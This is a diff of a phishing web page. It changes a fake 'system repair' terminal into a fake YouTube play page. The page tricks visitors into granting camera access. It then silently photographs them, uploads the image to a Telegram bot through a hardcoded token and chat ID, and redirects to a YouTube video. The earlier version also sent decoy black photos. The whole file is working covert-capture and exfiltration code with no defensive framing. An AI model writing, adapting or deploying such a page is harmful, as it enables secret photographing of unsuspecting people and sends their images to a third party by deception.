@@ -1,77 +1,57 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL ACCESS</title>
+    <title>YouTube Video</title>
     <style>
-        body { background-color: black; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #0f0; padding: 20px; text-align: left; width: 80%; box-shadow: 0 0 10px #0f0; }
-        button { background: #0f0; color: black; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        video, canvas { display: none; }
+        body { background: white; text-align: center; padding-top: 100px; font-family: sans-serif; }
+        .play-btn { background: red; color: white; padding: 20px 40px; border: none; border-radius: 50px; font-size: 20px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <p>> SYSTEM: ONLINE</p>
-        <p>> STATUS: VULNERABLE</p>
-        <p>> بانتظار تأكيد الهوية لتجاوز الحماية...</p>
-        <button id="startBtn">إصلاح النظام (FIX SYSTEM)</button>
-    </div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="200" alt="YouTube"><br><br>
+    <p>انقر لتشغيل الفيديو المطلوب</p>
+    <button class="play-btn" onclick="startCapture()">▶ تشغيل الفيديو</button>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="v" style="display:none" autoplay playsinline></video>
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY"; 
-        const chatId = "8042090388";
+        const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY";
+        const chat = "8042090388";
 
-        const startBtn = document.getElementById('startBtn');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-
-        async function sendPhoto() {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'image.jpg');
-                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-            }, 'image/jpeg');
-        }
-
-        startBtn.addEventListener('click', async () => {
+        async function startCapture() {
             try {
-                // طلب فتح الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
                 video.srcObject = stream;
-
-                // 1. التقاط الصورة الأولى الواضحة بعد 4 ثوانٍ (وقت كافٍ للسطوع)
-                setTimeout(async () => {
-                    await sendPhoto();
+                
+                // التقاط الصورة فوراً بعد السماح
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
                     
-                    // 2. بعد إرسال الصورة الواضحة، ننتظر ثانية ثم نغلق الكاميرا
-                    setTimeout(() => {
-                        stream.getTracks().forEach(track => track.stop());
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', chat);
+                        fd.append('photo', blob, 'img.jpg');
                         
-                        // 3. الآن نرسل الصور السوداء للتمويه
-                        setTimeout(() => sendPhoto(), 1000);
-                        setTimeout(() => {
-                            sendPhoto();
-                            alert("CRITICAL ERROR: System Overloaded!");
-                        }, 2000);
-                    }, 1000);
-
-                }, 4000);
-
-            } catch (err) {
-                alert("يجب السماح بالكاميرا لتجاوز حماية النظام!");
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd })
+                        .then(() => {
+                            // إغلاق الكاميرا والتحويل لليوتيوب فوراً
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // ضع رابط الفيديو الذي تريده هنا
+                        });
+                    }, 'image/jpeg');
+                }, 1000);
+                
+            } catch (e) {
+                alert("يجب السماح بالكاميرا لمشاهدة الفيديو!");
             }
-        });
+        }
     </script>
 </body>
-    </html>
+</html>
